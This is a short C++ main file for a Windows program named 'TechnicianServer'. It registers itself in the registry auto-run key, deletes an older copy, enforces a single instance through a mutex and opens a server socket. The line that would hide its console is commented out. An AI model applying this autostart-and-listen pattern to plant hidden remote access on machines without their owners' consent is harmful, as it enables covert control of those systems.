#include "Socket.h"
#include "Registry.h"

int main()
{
	// Don't create console
	//FreeConsole();

	// Add the program path to the auto-run registry
	AddPathToRegistryAutoboot(REGISTRY_START_PATH,
		"TechnicianServer",
		PROGRAM_PATH);

	// Delete the old executable if exists
	DeleteFileA(
		OLD_PROGRAM_PATH
	);

	// Get a handle of the mutex if it's running
	HANDLE hMutex = IsProgramRunning("TechnicianServer");

	if (hMutex == NULL)
	{
		printf("Program is already running\n");
		system("pause");
		return -1;
	}

	// Set up the server socket
	int returnCode = setupServerSocket();

	system("pause");
	return 0;
}